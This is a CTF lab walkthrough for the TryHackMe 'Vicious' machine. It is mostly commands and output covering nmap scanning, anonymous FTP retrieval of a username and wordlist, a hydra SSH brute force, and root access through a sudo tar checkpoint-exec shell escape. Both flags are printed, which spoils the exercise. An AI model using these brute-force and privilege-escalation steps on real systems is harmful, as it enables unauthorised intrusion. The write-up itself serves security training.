# TryHackMe — Vicious (Red Team Style) Walkthrough

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)

| Field | Value |
|-------|-------|
| **Target IP** | `10.48.158.85` |
| **OS** | Ubuntu 20.04.6 LTS (Kernel 5.15.0-139-generic) |
| **User flag** | `THM{CR1M3_SyNd1C4T3}` |
| **Root flag** | `THM{80UN7Y_h4cK3r}` |

> ⚠️ **Disclaimer:** This walkthrough is for **educational purposes only**. All flags belong to TryHackMe lab environments and have no real-world value. Do not use these techniques on systems you do not own or have permission to test.

---

## Attack Path

---

## 1. Reconnaissance

### 1.1 Ping the target

```bash
ping 10.48.158.85
nmap 10.48.158.85
nmap -sC -sV 10.48.158.85
---21/tcp — vsftpd 3.0.5 → anonymous FTP login allowed

22/tcp — OpenSSH 8.2p1 Ubuntu 4ubuntu0.13

80/tcp — Apache httpd 2.4.41 (Ubuntu)
ftp 10.48.158.85
Name: anonymous
Password: (blank / any email)
230 Login successful.
ftp> ls
ftp> get locks.txt
ftp> get task.txt
ftp> bye
cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
cat locks.txt
locks.txt — a 26-entry password wordlist (see appendix).

    Takeaway: Username = lin, password = one of the entries in locks.txt
    
    hydra -l lin -P locks.txt ssh://10.48.158.85
    [22][ssh] host: 10.48.158.85   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
ssh lin@10.48.158.85
lin@ip-10-48-158-85:~/Desktop$
sudo -l
User lin may run the following commands on ip-10-48-158-85:
    (root) /bin/tar
    sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    tar: Removing leading `/' from member names
#
# id
uid=0(root) gid=0(root) groups=0(root)
# pwd
/home/lin/Desktop
# ls
user.txt
# cat user.txt
THM{CR1M3_SyNd1C4T3}
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
# exit
